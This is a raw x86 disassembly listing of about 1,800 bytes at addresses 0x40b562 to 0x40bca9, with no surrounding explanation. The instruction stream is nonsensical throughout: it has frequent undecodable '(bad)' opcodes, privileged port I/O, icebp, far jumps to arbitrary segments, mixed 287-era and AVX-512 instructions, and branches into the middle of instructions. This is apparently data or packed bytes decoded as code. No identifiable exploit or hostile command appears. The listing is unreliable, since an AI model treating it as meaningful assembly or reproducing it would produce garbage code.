  40b562:	fwait
  40b563:	clc    
  40b564:	leave  
  40b565:	out    0x79,eax
  40b567:	fisubr WORD PTR [esi-0x78543a83]
  40b56d:	and    BYTE PTR [ebx-0x13],dl
  40b570:	je     0x40b528
  40b572:	or     esi,DWORD PTR [ebx-0x2a]
  40b575:	mov    ah,0x11
  40b577:	inc    edx
  40b578:	clc    
  40b579:	mov    cl,0xd4
  40b57b:	xor    bh,ah
  40b57d:	loope  0x40b58e
  40b57f:	scas   al,BYTE PTR es:[edi]
  40b580:	stos   BYTE PTR es:[edi],al
  40b581:	dec    esi
  40b582:	jne    0x40b5b2
  40b584:	stos   BYTE PTR es:[edi],al
  40b585:	xchg   esp,eax
  40b586:	sahf   
  40b587:	inc    ecx
  40b588:	test   DWORD PTR [edi+0x32],edx
  40b58b:	xchg   esi,eax
  40b58c:	mov    DWORD PTR [edx-0x1fd5467a],ebp
  40b592:	emms   
  40b594:	mov    eax,DWORD PTR [eax]
  40b596:	(bad)  
  40b598:	add    DWORD PTR [edi],edx
  40b59a:	out    dx,al
  40b59b:	or     al,0xea
  40b59d:	dec    esi
  40b59e:	xchg   edx,eax
  40b59f:	pusha  
  40b5a0:	out    dx,eax
  40b5a1:	sub    DWORD PTR [ebp+ecx*2-0x22],0x999d398f
  40b5a9:	mov    edi,0xf9acb3b5
  40b5ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5af:	mov    bl,0x4a
  40b5b1:	repnz out 0x9a,eax
  40b5b4:	or     al,0x68
  40b5b6:	push   0xb
  40b5b8:	sar    BYTE PTR [ebx+0x1b],0xdb
  40b5bc:	cmp    edx,DWORD PTR [ecx+edi*4+0x5187b17c]
  40b5c3:	iret   
  40b5c4:	sbb    esp,DWORD PTR [esi-0x60]
  40b5c7:	adc    esp,DWORD PTR [ecx]
  40b5c9:	mov    ecx,0xe5611bb1
  40b5ce:	inc    ecx
  40b5cf:	enter  0xaec5,0x21
  40b5d3:	push   es
  40b5d4:	addr16 ss add eax,0x713dc000
  40b5db:	jo     0x40b5cb
  40b5dd:	cmp    dh,BYTE PTR [eax+ebx*2]
  40b5e0:	dec    eax
  40b5e1:	mov    bh,0x16
  40b5e3:	jl     0x40b571
  40b5e5:	inc    ebx
  40b5e6:	cmp    BYTE PTR [ebx+0x74],dl
  40b5e9:	or     ebx,DWORD PTR [edx+0x3279fe19]
  40b5ef:	dec    edx
  40b5f0:	repnz sub esi,ebp
  40b5f3:	fsubr  QWORD PTR [esi+edx*2-0x2b]
  40b5f7:	mov    al,ds:0x5f40e464
  40b5fc:	jae    0x40b5f4
  40b5fe:	jo     0x40b669
  40b600:	mov    ecx,0x44a70574
  40b605:	lods   al,BYTE PTR ds:[esi]
  40b606:	in     eax,0x36
  40b608:	sub    eax,0xef463c66
  40b60d:	push   ebx
  40b60e:	into   
  40b60f:	call   0x320e1b30
  40b614:	inc    edi
  40b615:	and    ah,dh
  40b617:	stos   DWORD PTR es:[edi],eax
  40b618:	ja     0x40b601
  40b61a:	lods   al,BYTE PTR ds:[esi]
  40b61b:	xchg   ecx,eax
  40b61c:	cmp    eax,0x584d1c4c
  40b621:	mov    dh,al
  40b623:	sbb    al,0xf4
  40b625:	adc    al,0xab
  40b627:	add    al,BYTE PTR [esi-0x4c9d3623]
  40b62d:	int    0xe9
  40b62f:	inc    esi
  40b630:	jmp    0x40b68b
  40b632:	out    dx,al
  40b633:	cmc    
  40b634:	mov    edx,0x531df6a5
  40b639:	mov    ch,0x5d
  40b63b:	inc    eax
  40b63c:	stc    
  40b63d:	cdq    
  40b63e:	vpmulhw xmm7,xmm2,XMMWORD PTR [edx]
  40b642:	pop    ebx
  40b643:	jns    0x40b66b
  40b645:	add    bh,0xf4
  40b648:	xchg   esi,eax
  40b649:	dec    ecx
  40b64a:	and    bl,dl
  40b64c:	jl     0x40b6b9
  40b64e:	test   BYTE PTR [esi+edi*4-0x1c4c7b78],ah
  40b655:	inc    ecx
  40b656:	dec    BYTE PTR [esi-0x4b7c6a26]
  40b65c:	mov    dh,0xf
  40b65e:	mov    eax,ds:0x5208a8db
  40b663:	mov    gs,ecx
  40b665:	inc    eax
  40b666:	jge    0x40b665
  40b668:	fmulp  st(1),st
  40b66a:	(bad)  [eax-0x2bc17c4d]
  40b670:	scas   al,BYTE PTR es:[edi]
  40b671:	sbb    ebp,DWORD PTR [ebp-0x29]
  40b674:	push   edx
  40b675:	xchg   ebx,eax
  40b676:	mov    eax,0x62b1071b
  40b67b:	ret    0x1f0b
  40b67e:	mov    cl,0x8e
  40b680:	mov    bl,0x84
  40b682:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b683:	mov    eax,0x5bec93b5
  40b688:	push   ecx
  40b689:	mov    ecx,0x6806e553
  40b68e:	loope  0x40b644
  40b690:	push   ds
  40b691:	jecxz  0x40b680
  40b693:	arpl   WORD PTR [eax+ebx*4+0xe169564],si
  40b69a:	pop    ebx
  40b69b:	dec    esi
  40b69c:	imul   ecx,DWORD PTR [edx],0xc333508d
  40b6a2:	mov    esi,0xaf261fca
  40b6a7:	sub    ebp,DWORD PTR [ebx+eiz*1-0x55b09b23]
  40b6ae:	add    DWORD PTR [ebp-0x5a3c38ce],eax
  40b6b4:	mov    al,ds:0x2a87d1b5
  40b6b9:	adc    BYTE PTR [ebx-0x50],ch
  40b6bc:	sbb    BYTE PTR [ebx+esi*2+0x6446457b],ch
  40b6c3:	pushf  
  40b6c4:	mov    eax,0xf5026a4c
  40b6c9:	leave  
  40b6ca:	fwait
  40b6cb:	xor    DWORD PTR [edx],ebp
  40b6cd:	(bad)  
  40b6ce:	(bad)  
  40b6cf:	cld    
  40b6d0:	xchg   ebx,eax
  40b6d1:	inc    edi
  40b6d2:	(bad)  
  40b6d3:	fsub   QWORD PTR ds:0x19b1aae0
  40b6d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6da:	jge    0x40b748
  40b6dc:	daa    
  40b6dd:	pop    esi
  40b6de:	xor    ebx,DWORD PTR [edi]
  40b6e0:	adc    eax,0xae581cc4
  40b6e5:	sub    DWORD PTR [edx-0x56],ebp
  40b6e8:	dec    esi
  40b6e9:	sub    al,BYTE PTR [edx]
  40b6eb:	addr16 in al,0xf9
  40b6ee:	xor    cl,al
  40b6f0:	push   cs
  40b6f1:	call   0xd9a5:0xe8d4f369
  40b6f8:	and    edi,DWORD PTR [ecx+edx*2-0x67]
  40b6fc:	mov    bh,0xe3
  40b6fe:	or     edi,DWORD PTR [esi-0x7b]
  40b701:	sub    ch,BYTE PTR [edx+0x51bd4dc]
  40b707:	xchg   edi,eax
  40b708:	mov    WORD PTR [ebx-0x55],ds
  40b70b:	mov    cl,0xe5
  40b70d:	xchg   edi,eax
  40b70e:	inc    eax
  40b70f:	push   esp
  40b710:	inc    edi
  40b711:	shr    BYTE PTR [esi-0x69424d2a],1
  40b717:	sbb    edx,DWORD PTR [eax-0x7b]
  40b71a:	or     al,0x8b
  40b71c:	adc    ebp,esp
  40b71e:	mov    dh,0x9a
  40b720:	cdq    
  40b721:	(bad)  [edi]
  40b723:	or     al,ch
  40b725:	xchg   BYTE PTR [esi-0x15516c86],bl
  40b72b:	jns    0x40b6af
  40b72d:	adc    bl,al
  40b72f:	shl    esi,1
  40b731:	xchg   BYTE PTR [ebx-0x1f6f38c0],ch
  40b737:	xor    eax,0x6c0b26e3
  40b73c:	loop   0x40b709
  40b73e:	sub    al,0xc3
  40b740:	sub    esi,DWORD PTR [edx+0x5b]
  40b743:	jnp    0x40b79f
  40b745:	mov    ah,0xd5
  40b747:	jnp    0x40b7c7
  40b749:	jo     0x40b7bc
  40b74b:	mov    dh,0x15
  40b74d:	and    al,0x88
  40b74f:	cmp    cl,dl
  40b751:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b752:	and    esi,edx
  40b754:	and    cl,dl
  40b756:	push   0xf90f142e
  40b75b:	push   esp
  40b75c:	les    edx,FWORD PTR [ebx]
  40b75e:	(bad)  
  40b760:	mov    DWORD PTR [eax-0x5512f6b2],edx
  40b766:	jle    0x40b77b
  40b768:	test   BYTE PTR [ecx],dh
  40b76a:	bound  ebx,QWORD PTR [ecx-0x50]
  40b76d:	lock ins BYTE PTR es:[edi],dx
  40b76f:	sbb    eax,0x34d634ae
  40b774:	pop    esi
  40b775:	push   ds
  40b776:	mov    WORD PTR [edi],?
  40b778:	mov    WORD PTR [ebx-0x72a402a7],ss
  40b77e:	mov    esi,0xe1b9f5f0
  40b783:	je     0x40b765
  40b785:	jp     0x40b726
  40b787:	sub    edi,ecx
  40b789:	cli    
  40b78a:	mov    al,ds:0xeb35c18e
  40b78f:	cmc    
  40b790:	jae    0x40b7b6
  40b792:	and    al,0x5b
  40b794:	loope  0x40b7f4
  40b796:	mov    BYTE PTR [esi-0x5fecaaeb],ah
  40b79c:	mov    edx,0x3b1afdd
  40b7a1:	stos   DWORD PTR es:[edi],eax
  40b7a2:	jne    0x40b7c3
  40b7a4:	fadd   st,st(5)
  40b7a6:	xor    edi,edi
  40b7a8:	add    al,0xa7
  40b7aa:	mov    dl,0xba
  40b7ac:	in     al,dx
  40b7ad:	and    al,0x92
  40b7af:	inc    esp
  40b7b0:	mov    ebp,0xeda4f34
  40b7b5:	adc    esi,DWORD PTR [edi+eiz*2]
  40b7b8:	sbb    eax,0x9c41d2c5
  40b7bd:	mov    ds:0x2890c68a,eax
  40b7c2:	inc    eax
  40b7c3:	into   
  40b7c4:	fwait
  40b7c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7c6:	mov    ebx,DWORD PTR [ebx-0xc5b56d6]
  40b7cc:	(bad)  
  40b7cd:	rol    BYTE PTR [esi+0x62],0xb3
  40b7d1:	ror    DWORD PTR [esi],1
  40b7d3:	xchg   edi,eax
  40b7d4:	bound  ebx,QWORD PTR [edx]
  40b7d6:	arpl   sp,dx
  40b7d8:	push   ebp
  40b7d9:	pop    ss
  40b7da:	xlat   BYTE PTR ds:[ebx]
  40b7db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7dc:	or     eax,0x5b0ad8e9
  40b7e1:	cdq    
  40b7e2:	inc    eax
  40b7e3:	inc    ecx
  40b7e4:	xchg   edx,eax
  40b7e5:	scas   al,BYTE PTR es:[edi]
  40b7e6:	pop    edi
  40b7e7:	pop    edi
  40b7e8:	push   es
  40b7e9:	pop    edi
  40b7ea:	push   esp
  40b7eb:	dec    ebp
  40b7ec:	pusha  
  40b7ed:	or     BYTE PTR [esi-0x6f691a5d],0x1e
  40b7f4:	in     al,dx
  40b7f5:	mov    BYTE PTR [ecx+0x17],ah
  40b7f8:	mov    ebp,0xe8b5e2c5
  40b7fd:	mov    WORD PTR [ebx+0x7397ad7a],?
  40b803:	test   BYTE PTR [ecx+0x62b2c385],bh
  40b809:	jge    0x40b862
  40b80b:	adc    dl,BYTE PTR [ecx]
  40b80d:	push   es
  40b80e:	std    
  40b80f:	loope  0x40b7a5
  40b811:	fldcw  WORD PTR [ebp-0x68]
  40b814:	sub    al,0x74
  40b816:	pop    edx
  40b817:	push   0xfffffff9
  40b819:	std    
  40b81a:	mov    ecx,0x8c74f40d
  40b81f:	cld    
  40b820:	das    
  40b821:	mov    ebx,0xfcd15204
  40b826:	outs   dx,BYTE PTR ds:[esi]
  40b827:	xchg   BYTE PTR [esi],ch
  40b829:	out    0x76,eax
  40b82b:	sub    BYTE PTR [ecx],al
  40b82d:	fadd   QWORD PTR [ecx+0x4df5215d]
  40b833:	clc    
  40b834:	aaa    
  40b835:	mov    ebx,0x9452f642
  40b83a:	mov    ebx,0xe91a2f8b
  40b83f:	xchg   edx,eax
  40b840:	fimul  WORD PTR [ebx+edx*4+0x4ffd834c]
  40b847:	fs or  al,0x1f
  40b84a:	stos   BYTE PTR es:[edi],al
  40b84b:	inc    esp
  40b84c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b84d:	dec    esi
  40b84e:	icebp  
  40b84f:	xchg   BYTE PTR [ebp+ebp*2-0x26],al
  40b853:	std    
  40b854:	out    dx,al
  40b855:	outs   dx,BYTE PTR ds:[esi]
  40b856:	lods   al,BYTE PTR ds:[esi]
  40b857:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b858:	mov    cl,0x7e
  40b85a:	test   DWORD PTR [edx+0x70],edx
  40b85d:	out    0xf4,al
  40b85f:	jmp    0x40b844
  40b861:	kmovb  k2,k0
  40b865:	xor    eax,0x52cd473c
  40b86a:	inc    edx
  40b86b:	jae    0x40b89d
  40b86d:	sub    BYTE PTR [ecx-0x28],dl
  40b870:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b871:	pop    ss
  40b872:	inc    ecx
  40b873:	xchg   edi,eax
  40b874:	mov    al,0xf6
  40b876:	xchg   ecx,eax
  40b877:	lea    edx,[eax-0x4fbb79dc]
  40b87d:	mov    edi,0x8f1791fe
  40b882:	ret    0xda0a
  40b885:	and    DWORD PTR [ebx+0x854fbda],ecx
  40b88b:	popa   
  40b88c:	add    al,0x28
  40b88e:	dec    eax
  40b88f:	cmp    bl,BYTE PTR [esi+0x29a07976]
  40b895:	add    BYTE PTR [edi],bh
  40b897:	ret    0xfb91
  40b89a:	sub    BYTE PTR [ebx],ah
  40b89c:	inc    eax
  40b89d:	div    ah
  40b89f:	test   DWORD PTR [esi-0x6b801ed4],esp
  40b8a5:	jns    0x40b86b
  40b8a7:	push   es
  40b8a8:	fmul   DWORD PTR [ebx+0x5c4246d0]
  40b8ae:	iret   
  40b8af:	push   ebx
  40b8b0:	mov    eax,ds:0xab69af12
  40b8b5:	sti    
  40b8b6:	push   es
  40b8b7:	sar    DWORD PTR [edi-0x6972cf46],cl
  40b8bd:	pop    es
  40b8be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8bf:	add    bh,BYTE PTR [edi+0x23c6d9d7]
  40b8c5:	fld    DWORD PTR [eax-0x682d7c2]
  40b8cb:	jle    0x40b943
  40b8cd:	dec    ebp
  40b8ce:	repz gs push 0xffffffa9
  40b8d2:	inc    ebx
  40b8d3:	jmp    0x40b874
  40b8d5:	inc    edx
  40b8d6:	cwde   
  40b8d7:	adc    al,0x4f
  40b8d9:	jle    0x40b898
  40b8db:	pop    ebx
  40b8dc:	sar    DWORD PTR [ebp+0x40da24c7],cl
  40b8e2:	stos   DWORD PTR es:[edi],eax
  40b8e3:	popa   
  40b8e4:	dec    esi
  40b8e5:	push   ds
  40b8e6:	inc    esi
  40b8e7:	mov    esp,0xff786def
  40b8ec:	mov    edx,0x5c1319
  40b8f1:	shr    DWORD PTR [edi+0x4744e2a2],1
  40b8f7:	loopne 0x40b8a2
  40b8f9:	mov    cl,cl
  40b8fb:	mov    al,0x9e
  40b8fd:	stc    
  40b8fe:	int    0x34
  40b900:	jns    0x40b933
  40b902:	icebp  
  40b903:	sub    bh,bl
  40b905:	push   eax
  40b906:	scas   al,BYTE PTR es:[edi]
  40b907:	out    dx,eax
  40b908:	stos   DWORD PTR es:[edi],eax
  40b909:	sti    
  40b90a:	(bad)  
  40b90b:	lock ins DWORD PTR es:[edi],dx
  40b90d:	mov    esi,0x55457ede
  40b912:	cmp    ah,BYTE PTR [ecx+0x56c61276]
  40b918:	jo     0x40b95e
  40b91a:	jmp    0x31358178
  40b91f:	adc    edx,ebx
  40b921:	mov    edi,DWORD PTR [eax-0x46fe1821]
  40b927:	mov    ecx,0xf3626555
  40b92c:	stc    
  40b92d:	and    al,0x87
  40b92f:	clc    
  40b930:	shl    ah,cl
  40b932:	add    al,0x85
  40b934:	ficomp DWORD PTR [ebp+ecx*4+0x7e]
  40b938:	sub    eax,0x13abb326
  40b93d:	mov    dh,0xd7
  40b93f:	fadd   st,st(3)
  40b941:	xor    edi,DWORD PTR [ebp+0x26a7487d]
  40b947:	jg     0x40b9b3
  40b949:	adc    eax,DWORD PTR ds:0xec40894b
  40b94f:	lahf   
  40b950:	dec    esp
  40b951:	test   DWORD PTR ds:0xfb31fdbe,ecx
  40b957:	call   0x2cd1d8c8
  40b95c:	mov    esi,0x6a101619
  40b961:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b962:	xor    DWORD PTR [edi+0x20],ebx
  40b965:	and    eax,0xdca22345
  40b96a:	sub    DWORD PTR [esi-0x2],ecx
  40b96d:	and    eax,DWORD PTR [edi]
  40b96f:	push   edx
  40b970:	stos   BYTE PTR es:[edi],al
  40b971:	repz and edi,DWORD PTR [edi-0x3b45920d]
  40b978:	bound  ebx,QWORD PTR [esi-0x4f]
  40b97b:	jmp    0xb09c:0xf67f2d5b
  40b982:	arpl   di,dx
  40b984:	(bad)  
  40b985:	out    0xc5,al
  40b987:	loop   0x40b9ef
  40b989:	or     cl,BYTE PTR [ecx+eiz*2+0x17]
  40b98d:	push   ds
  40b98e:	in     eax,0xb8
  40b990:	mov    al,0x7
  40b992:	push   eax
  40b993:	xor    eax,0x4366790c
  40b998:	xlat   BYTE PTR ds:[ebx]
  40b999:	inc    ebx
  40b99a:	xchg   BYTE PTR [edi],dl
  40b99c:	(bad)  
  40b99d:	xlat   BYTE PTR ds:[ebx]
  40b99e:	xchg   edi,eax
  40b99f:	push   0xf27b0cee
  40b9a4:	xor    BYTE PTR ds:0x9ff30d9b,bh
  40b9aa:	pop    edx
  40b9ab:	jmp    0x72b14a95
  40b9b0:	pushf  
  40b9b1:	sub    DWORD PTR [ebx+0x55260965],0x18
  40b9b8:	jns    0x40ba2d
  40b9ba:	push   edi
  40b9bb:	mov    cl,BYTE PTR [ebx]
  40b9bd:	mov    ecx,0x9f083cce
  40b9c2:	icebp  
  40b9c3:	inc    ebx
  40b9c4:	push   ebx
  40b9c5:	int    0x82
  40b9c7:	imul   ecx,DWORD PTR [edi],0xf0542007
  40b9cd:	pushf  
  40b9ce:	mov    ?,esp
  40b9d0:	arpl   WORD PTR ds:0xf4e51aea,bx
  40b9d6:	push   ebp
  40b9d7:	add    DWORD PTR [edx+ebx*2-0x7e],0x70
  40b9dc:	mov    edi,0xf2041dad
  40b9e1:	inc    ebx
  40b9e2:	xchg   BYTE PTR [eax],bl
  40b9e4:	fstp   DWORD PTR [ecx-0x63955b47]
  40b9ea:	mov    ebx,0xe67aa82d
  40b9ef:	push   ecx
  40b9f0:	not    DWORD PTR [esi+0x3]
  40b9f3:	mov    ds,edi
  40b9f5:	shl    bh,cl
  40b9f7:	imul   esp,ebx,0xffffffe5
  40b9fa:	enter  0x3062,0x2c
  40b9fe:	enter  0x5feb,0x5f
  40ba02:	sub    ecx,0xffffffd1
  40ba05:	xchg   edx,eax
  40ba06:	sub    DWORD PTR [esi],0x6ee26860
  40ba0c:	ja     0x40b9ab
  40ba0e:	fs (bad) 
  40ba10:	jle    0x40b9c4
  40ba12:	hlt    
  40ba13:	cmc    
  40ba14:	adc    eax,0x71d87180
  40ba19:	ror    BYTE PTR [ebx],0x75
  40ba1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba1d:	mov    al,0xae
  40ba1f:	pop    ebp
  40ba20:	dec    ecx
  40ba21:	(bad)  
  40ba22:	mov    ebp,0x5778b769
  40ba27:	scas   al,BYTE PTR es:[edi]
  40ba28:	push   0x8aac7ca8
  40ba2d:	out    0x34,eax
  40ba2f:	xchg   DWORD PTR [edi],edx
  40ba31:	(bad)  
  40ba32:	cmp    dh,ch
  40ba34:	push   ss
  40ba35:	inc    edi
  40ba36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba37:	inc    ebx
  40ba38:	shl    ah,0x63
  40ba3b:	cwde   
  40ba3c:	xchg   ebx,eax
  40ba3d:	jno    0x40ba0c
  40ba3f:	pop    edi
  40ba40:	fs jge 0x40b9eb
  40ba43:	out    dx,al
  40ba44:	or     eax,0x54e75319
  40ba49:	shl    ah,0xf8
  40ba4c:	test   BYTE PTR [eax+0x7ec667e],0x1c
  40ba53:	jl     0x40bab6
  40ba55:	bound  edx,QWORD PTR [eax]
  40ba57:	pop    ds
  40ba58:	mov    ch,0xd1
  40ba5a:	lods   al,BYTE PTR ds:[esi]
  40ba5b:	and    bl,ah
  40ba5d:	cdq    
  40ba5e:	sbb    eax,0xb37ab52
  40ba63:	ret    0xd7a4
  40ba66:	aaa    
  40ba67:	mov    edi,0x53189a04
  40ba6c:	(bad)  
  40ba6d:	out    0x4c,eax
  40ba6f:	outs   dx,DWORD PTR ds:[esi]
  40ba70:	out    0x84,al
  40ba72:	inc    esi
  40ba73:	mov    ds:0x21e9613d,eax
  40ba78:	call   0x4ffb:0xf66b0fa9
  40ba7f:	xchg   esp,eax
  40ba80:	mov    edx,0xf6a90998
  40ba85:	xlat   BYTE PTR ds:[ebx]
  40ba86:	xor    eax,0x72bb6d5d
  40ba8b:	lock xchg edi,eax
  40ba8d:	outs   dx,BYTE PTR ds:[esi]
  40ba8e:	cmp    al,0x68
  40ba90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba91:	cs mov bl,0xde
  40ba94:	sbb    DWORD PTR [esi],ebp
  40ba96:	xchg   ebp,eax
  40ba97:	lods   al,BYTE PTR ds:[esi]
  40ba98:	mov    eax,0xb02e6e9f
  40ba9d:	push   edi
  40ba9e:	jmp    0xca2ea56d
  40baa3:	mov    ecx,0x1146d691
  40baa8:	mov    bl,0x29
  40baaa:	or     DWORD PTR [ecx+edi*8],0x8ba19437
  40bab1:	mov    ds:0x6950937b,eax
  40bab6:	pop    ebx
  40bab7:	push   ecx
  40bab8:	(bad)  
  40bab9:	pop    edx
  40baba:	or     ebx,esi
  40babc:	fstp   DWORD PTR [ebx]
  40babe:	cmp    eax,0x102690c4
  40bac3:	ins    DWORD PTR es:[edi],dx
  40bac4:	inc    ebx
  40bac5:	ss cmp edi,eax
  40bac8:	and    esi,DWORD PTR [ebx+0xe]
  40bacb:	inc    esp
  40bacc:	cmp    edi,DWORD PTR [ecx]
  40bace:	and    eax,0x566ed369
  40bad3:	in     eax,0xc6
  40bad5:	cmp    al,0x42
  40bad7:	dec    esi
  40bad8:	test   DWORD PTR [esi+0x3f2a79f3],esp
  40bade:	sub    eax,0x4ff59a5
  40bae3:	push   edx
  40bae4:	mov    bh,0x2c
  40bae6:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bae8:	(bad)  
  40bae9:	les    ecx,FWORD PTR [edx-0x6acf06d0]
  40baef:	popf   
  40baf0:	mov    cl,0x8
  40baf2:	sub    ch,BYTE PTR [edx+edi*8-0x76]
  40baf6:	ret    
  40baf7:	pop    esp
  40baf8:	lds    esp,FWORD PTR [ecx-0x37]
  40bafb:	adc    al,0x5d
  40bafd:	outs   dx,DWORD PTR ds:[esi]
  40bafe:	jbe    0x40bb0e
  40bb00:	push   edi
  40bb02:	das    
  40bb03:	(bad)  
  40bb04:	pop    ecx
  40bb05:	(bad)  
  40bb07:	aaa    
  40bb08:	ret    
  40bb09:	pop    esi
  40bb0a:	jmp    0x6cb5dc0f
  40bb0f:	mov    bh,0x32
  40bb11:	sub    al,0x1b
  40bb13:	and    BYTE PTR ds:0x5c1b83ea,dl
  40bb19:	fscale 
  40bb1b:	mov    esi,0x7beaa929
  40bb20:	stos   BYTE PTR es:[edi],al
  40bb21:	sbb    ebx,DWORD PTR [ebp+ecx*1-0xb9b9052]
  40bb28:	or     BYTE PTR [esi-0x3d],dl
  40bb2b:	and    eax,0x44ca6566
  40bb30:	push   edi
  40bb31:	jo     0x40bb7e
  40bb33:	push   dx
  40bb35:	cld    
  40bb36:	das    
  40bb37:	daa    
  40bb38:	mov    ecx,DWORD PTR [ebx+0x323883d3]
  40bb3e:	lods   al,BYTE PTR ds:[esi]
  40bb3f:	dec    edi
  40bb40:	add    DWORD PTR [edi-0x299d97e9],edi
  40bb46:	fdivp  st(0),st
  40bb48:	jl     0x40badf
  40bb4a:	dec    ecx
  40bb4b:	ret    0x7b5e
  40bb4e:	jmp    0x23447e48
  40bb53:	clc    
  40bb54:	outs   dx,DWORD PTR ds:[esi]
  40bb55:	xor    BYTE PTR [eax-0x40],cl
  40bb58:	push   ebp
  40bb59:	enter  0x9d30,0x67
  40bb5d:	push   cs
  40bb5e:	pusha  
  40bb5f:	neg    DWORD PTR [ebx]
  40bb61:	add    bh,bh
  40bb63:	push   ds
  40bb64:	and    eax,0x3fec4d6e
  40bb69:	sub    eax,0x3d57d304
  40bb6e:	mov    edx,0xdd4ae910
  40bb73:	inc    ecx
  40bb74:	push   ebp
  40bb75:	fnsetpm(287 only) 
  40bb77:	test   eax,0x55e710ee
  40bb7c:	cmp    bh,BYTE PTR [edi+eax*4+0x44e8e0fd]
  40bb83:	mov    BYTE PTR [esi],bl
  40bb85:	mov    eax,ds:0x8445c513
  40bb8a:	push   ss
  40bb8b:	xor    eax,0x76a2259f
  40bb90:	xor    eax,0x5f7e877a
  40bb95:	xor    dl,BYTE PTR [edi]
  40bb97:	adc    al,BYTE PTR [ebx]
  40bb99:	sub    BYTE PTR [edi-0x6d7c7b6a],0xbb
  40bba0:	mov    ecx,ecx
  40bba2:	xchg   esp,eax
  40bba3:	clc    
  40bba4:	in     eax,0x7d
  40bba6:	cmp    DWORD PTR [edx],esi
  40bba8:	mov    ecx,0x1b195534
  40bbad:	(bad)  
  40bbae:	sar    BYTE PTR [ecx],1
  40bbb0:	hlt    
  40bbb1:	jmp    0x8aa26e2d
  40bbb6:	pushf  
  40bbb7:	adc    ebp,DWORD PTR [edi-0x4c]
  40bbba:	push   ebx
  40bbbb:	test   DWORD PTR [ecx],eax
  40bbbd:	xlat   BYTE PTR ds:[ebx]
  40bbbe:	cmc    
  40bbbf:	adc    ebx,DWORD PTR [edx-0x77]
  40bbc2:	int    0x6
  40bbc4:	in     eax,0x9d
  40bbc6:	dec    edx
  40bbc7:	ret    
  40bbc8:	push   edx
  40bbc9:	cmp    al,0x2
  40bbcb:	xor    esp,DWORD PTR [edx-0x45]
  40bbce:	or     BYTE PTR [ebx],cl
  40bbd0:	cmc    
  40bbd1:	or     bh,BYTE PTR [edx-0x6b]
  40bbd4:	mov    ch,0x88
  40bbd6:	push   0xfffffff6
  40bbd8:	mov    ah,0xb4
  40bbda:	jo     0x40bbe8
  40bbdc:	mov    ds,WORD PTR [ebx+0x7a69d4d1]
  40bbe2:	inc    edx
  40bbe3:	and    edi,DWORD PTR [ebx+ecx*8-0x78]
  40bbe7:	adc    cl,ah
  40bbe9:	and    eax,0x8ec8560f
  40bbee:	idiv   BYTE PTR [ebp+0x54d887b9]
  40bbf4:	pop    es
  40bbf5:	retf   0x93ef
  40bbf8:	scas   eax,DWORD PTR es:[edi]
  40bbf9:	push   edi
  40bbfa:	shl    BYTE PTR [ecx+esi*4+0x26a71b50],1
  40bc01:	(bad)  
  40bc02:	and    ebp,DWORD PTR [eax+0x6c]
  40bc05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc06:	not    DWORD PTR [edi]
  40bc08:	outs   dx,BYTE PTR ds:[esi]
  40bc09:	popf   
  40bc0a:	sub    BYTE PTR [ecx+0x50],bh
  40bc0d:	xor    ah,BYTE PTR [eax]
  40bc0f:	addr16 sahf 
  40bc11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc12:	adc    DWORD PTR [eax+0x14],0xffffff9c
  40bc16:	xchg   BYTE PTR [edx],ch
  40bc18:	adc    al,0x5
  40bc1a:	stc    
  40bc1b:	sub    BYTE PTR [ecx],bh
  40bc1d:	pop    esi
  40bc1e:	cmc    
  40bc1f:	jbe    0x40bbfe
  40bc21:	sbb    eax,0x80494d9f
  40bc26:	ffree  st(7)
  40bc28:	imul   ebx,esi,0xffffffc3
  40bc2b:	and    edi,DWORD PTR [eax]
  40bc2d:	cld    
  40bc2e:	mov    ch,0xd6
  40bc30:	pop    ds
  40bc31:	push   0x65b49ef5
  40bc36:	mov    edi,0xeaa3ec95
  40bc3b:	push   eax
  40bc3c:	jb     0x40bc0e
  40bc3e:	rol    DWORD PTR ds:0xb52fb176,1
  40bc44:	mov    DWORD PTR [esp+ebp*8-0x10],ebp
  40bc48:	push   edx
  40bc49:	push   esi
  40bc4a:	loop   0x40bc0c
  40bc4c:	sub    eax,0xd8da13fc
  40bc51:	jnp    0x40bc7a
  40bc53:	(bad)  
  40bc54:	dec    ecx
  40bc55:	mov    dh,0x98
  40bc57:	shl    BYTE PTR [ecx-0x2a],0x72
  40bc5b:	adc    DWORD PTR [ebp+0x55],0x4c
  40bc5f:	call   0x14fb:0x2dfd2351
  40bc66:	xchg   cl,bl
  40bc68:	push   edx
  40bc69:	sbb    eax,0xae51dae
  40bc6e:	mov    bl,0x6b
  40bc70:	adc    BYTE PTR [edi],0x1a
  40bc73:	pusha  
  40bc74:	and    eax,0xc7229d0d
  40bc79:	push   ebp
  40bc7a:	stos   BYTE PTR es:[edi],al
  40bc7b:	cmp    al,0x4d
  40bc7d:	push   ds
  40bc7e:	pop    DWORD PTR [ebp+ebx*8+0x22]
  40bc82:	(bad)  [eax]
  40bc84:	xlat   BYTE PTR ds:[ebx]
  40bc85:	int3   
  40bc86:	dec    ecx
  40bc87:	hlt    
  40bc88:	push   ds
  40bc89:	mov    esp,0x4ad122af
  40bc8e:	add    ebx,DWORD PTR [edi+0x6647b397]
  40bc94:	mov    bh,0x3e
  40bc96:	(bad)  
  40bc97:	ja     0x40bc41
  40bc99:	lods   eax,DWORD PTR ds:[esi]
  40bc9a:	push   ecx
  40bc9b:	and    ch,BYTE PTR [ebx-0x27d10182]
  40bca1:	push   ss
  40bca2:	leave  
  40bca3:	lea    esp,[ebp-0x6f]
  40bca6:	push   ebx
  40bca7:	popf   
  40bca8:	cmc    
  40bca9:	push   ds
